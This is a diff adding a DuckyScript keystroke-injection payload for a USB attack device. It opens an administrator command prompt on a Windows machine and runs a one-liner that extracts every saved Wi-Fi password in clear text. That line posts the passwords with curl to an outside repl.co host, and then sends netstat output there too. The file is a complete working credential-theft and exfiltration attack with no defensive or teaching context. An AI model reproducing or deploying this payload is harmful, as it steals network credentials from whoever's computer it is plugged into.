@@ -1,0 +1,18 @@
+DELAY 500
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 2000
+ESC
+DELAY 2000
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | curl -X POST -d @- https://chicharroneragalileo.lalalejandro.repl.co/wifi&&netstat -an | curl -X POST -d @- https://chicharroneragalileo.lalalejandro.repl.co/ports
+DELAY 1000
+ENTER
+DELAY 1000
+GUI d
